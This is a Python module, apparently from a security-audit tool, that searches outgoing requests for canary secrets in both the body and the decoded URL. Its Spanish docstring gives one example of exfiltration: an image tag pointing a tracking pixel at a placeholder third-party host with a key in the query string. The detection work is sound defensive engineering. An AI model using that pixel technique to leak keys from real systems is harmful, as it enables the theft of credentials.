"""Busqueda de canarios en lo que sale por la red.

Los sensores de red (CDP y el proxy) buscaban el material sensible solo en el
cuerpo de las peticiones. Pero una peticion GET no tiene cuerpo, y un pixel de
seguimiento -- ``<img src="https://tercero/p.gif?k=...">`` -- lleva el .key
entero en la query string. Sin buscar en la URL, esa exfiltracion era
invisible para los dos sensores que no dependen de la instrumentacion, y el
reporte decia "no observado" con la clave fuera.

La URL se examina tal cual y decodificada: ``encodeURIComponent`` convierte el
``+``, la ``/`` y el ``=`` del base64 en ``%2B``, ``%2F`` y ``%3D``, y el
canario solo aparece tras decodificar.

Portado del PR #2, que encontro el fallo.
"""

from __future__ import annotations

from typing import Any

from ..audit_core.events import Tag
from ..audit_core.secrets import SecretVault, decoded_variants


def classify(vault: SecretVault | None, body: bytes | None,
             url: str = "") -> tuple[list[str], list[dict[str, Any]]]:
    """Etiquetas y coincidencias de canario de una salida.

    Cada coincidencia indica donde se encontro (``location``: ``body`` o
    ``url``). Un cuerpo presente sin coincidencias se marca UNCLASSIFIED; una
    URL sin coincidencias no, porque toda peticion tiene URL.
    """
    matches: list[dict[str, Any]] = []
    seen: set[tuple[str, str]] = set()

    def add(found, location: str) -> None:
        for match in found:
            key = (match.label, match.encoding)
            if key in seen:
                continue
            seen.add(key)
            item = match.to_dict()
            item["location"] = location
            matches.append(item)

    if vault is not None and vault.alive:
        if body:
            add(vault.scan(body), "body")
        if url and ("?" in url or "#" in url):
            for candidate in decoded_variants(url):
                add(vault.scan(candidate), "url")

    tags = sorted({m["label"] for m in matches})
    if not tags and body:
        tags = [Tag.UNCLASSIFIED.value]
    return tags, matches
